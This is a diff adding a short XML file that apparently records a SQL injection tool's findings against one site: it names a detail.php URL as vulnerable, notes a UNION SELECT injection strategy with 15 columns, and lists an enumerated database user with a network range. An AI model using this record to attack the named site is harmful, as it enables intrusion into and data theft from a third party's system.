@@ -1,0 +1,11 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<map>
+  <vulnerable-url>http://www.ohioaprs.net/ar902/detail.php?id=169</vulnerable-url>
+  <injection-strategy name="UnionSelect" nr-columns-original-query="15" />
+  <dbms>
+    <users>
+      <user>ar902@173.236.128.0/255.255.128.0</user>
+    </users>
+  </dbms>
+  <databases></databases>
+</map>
